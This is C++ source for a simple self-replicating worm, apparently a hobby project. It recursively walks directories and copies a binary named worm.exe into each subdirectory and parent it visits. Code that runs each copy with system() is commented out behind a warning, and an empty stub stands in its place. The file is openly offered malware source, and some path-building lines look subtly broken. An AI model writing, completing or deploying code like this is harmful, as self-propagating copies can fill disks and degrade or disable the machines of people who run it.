#include <filesystem>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdlib>
#include "dir-hist.h"

DirectoryHistory dirhist;
std::string malware_cpp_file = "worm.exe";

std::vector<std::string> checkChildren(const std::string& path) {
	std::vector<std::string> sub_dirs;

	for (const auto& entry : std::filesystem::directory_iterator(path)) {
		if (entry.is_directory()) {
			sub_dirs.push_back(entry.path().filename().string());
		}
	}

	return sub_dirs;
}


void proliferate(std::string origin, std::string destination) {

	std::string worm_location = origin + "/" + malware_cpp_file;

	std::string dest = origin + "/" + destination + malware_cpp_file;

	const int buffer_size = 1024;
	char buffer[buffer_size];

	std::ifstream src(worm_location, std::ios::binary);
	std::ofstream dst(dest, std::ios::binary);
	
	while (src.read(buffer, buffer_size)) {
		dst.write(buffer, src.gcount());
	}

	dst.write(buffer, src.gcount());

	src.close();
	dst.close();
}

// DON'T RUN THIS CODE WITH THIS LINE UNLESS YOU WANT TO DESTROY YOUR PC PERFORMANCE
// void execute() {
// 	system("./" + malware_cpp_file);
// }
// RUN WITH THE BELOW execute FUNCTION

void execute(){
}


std::filesystem::path navigate(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
	if (!sub_dirs.empty()) {
		for (const std::string& subs : sub_dirs) {
			if (dirhist.directoryExists(origin.string() + "/" + subs)){
				continue;
			}
			dirhist.addDirectory(origin.string() + "/" + subs);
			proliferate(origin.string(), subs);
			execute();
			std::filesystem::path newOrigin(origin.string() + "/" + subs);
			std::vector<std::string> sub_sub_dirs = checkChildren(origin.string() + "/" + subs);
			return navigate(newOrigin, sub_sub_dirs);
		}
	}
	std::string parent = origin.parent_path().string();
	dirhist.addDirectory(parent);
	proliferate(origin.string(), parent);
	execute();
	origin = origin.parent_path();
	std::vector<std::string> parent_sub_dirs = checkChildren(origin.string());
	return navigate(origin, parent_sub_dirs);
}

int main() {
	std::filesystem::path origin = std::filesystem::current_path();

	std::vector<std::string> sub_dirs = checkChildren(origin.string());
	navigate(origin, sub_dirs);
	return 0;
}	